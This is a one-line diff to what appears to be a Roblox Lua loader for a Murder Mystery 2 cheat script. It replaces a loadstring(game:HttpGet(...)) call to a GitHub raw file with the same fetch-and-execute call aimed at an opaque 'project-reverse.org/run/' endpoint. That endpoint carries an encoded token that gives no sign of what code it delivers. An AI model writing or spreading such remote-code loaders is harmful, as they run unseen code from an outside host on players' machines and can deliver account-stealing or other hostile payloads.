@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/coffemug682-cmd/mm2script/refs/heads/main/mm2scriptt"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiZTNkYTU1LWQ4OGQtNDhjZi1hYmM1LTNlN2VlZWUyYjdlZiIsImtpbmQiOiJtZWRpYSJ9"))()
